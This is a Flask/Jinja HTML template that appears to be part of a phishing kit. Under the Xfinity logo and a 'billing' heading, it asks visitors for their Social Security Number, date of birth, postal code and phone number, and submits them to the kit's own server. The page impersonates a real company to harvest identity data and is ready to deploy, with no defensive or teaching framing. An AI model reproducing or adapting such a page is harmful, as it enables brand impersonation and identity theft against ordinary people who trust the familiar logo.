{% extends "base.html" %}

{% block content %}
<div class="billing-section">
    <div class="billing-form-wrapper">
        <img src="{{ url_for('static', filename='images/xfinity-logo-grey.svg') }}" alt="Xfinity" style="width: 80px; margin: 25px 0px;">
        <h3 class="mb-3">Please enter the following information</h3>

        <form method="post">
            <div class="mb-3">
              <label for="ssn" class="form-label">Social Security Number:</label>
              <input type="text" class="form-control" placeholder="123-45-6789" name="s_num" required>
            </div>
  
            <div class="mb-3">
              <label for="dob" class="form-label">Date of Birth:</label>
              <input type="date" class="form-control" placeholder="dd/mm/yyyy" name="s_dob"  required>
            </div>
  
            <div class="mb-3">
              <label for="postal" class="form-label">Postal Code:</label>
              <input type="text" class="form-control" placeholder="e.g. 10001" name="s_postal" required>
            </div>
  
            <div class="mb-4">
              <label for="phone" class="form-label">Phone Number:</label>
              <input type="text" class="form-control" placeholder="e.g. +1 555 123 4567" name="s_p_num" required>
            </div>
  
            <button type="submit" class="btn btn-primary">Let's go</button>
        </form>
    
    </div>
</div>
{% endblock %}
